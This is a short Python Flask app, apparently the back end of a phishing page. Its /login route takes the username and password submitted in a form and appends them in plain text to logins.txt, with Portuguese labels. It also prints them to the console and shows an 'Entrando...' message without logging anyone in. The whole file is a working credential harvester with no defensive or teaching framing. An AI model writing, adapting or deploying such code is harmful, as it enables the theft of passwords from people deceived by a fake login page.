from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('user')
    password = request.form.get('pass')

    with open("logins.txt", "a") as f:
        f.write(f"Usuário: {user} | Senha: {password}\n")

    print(f"[LOGIN] {user} | {password}")

    return "<h3>Entrando...</h3>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
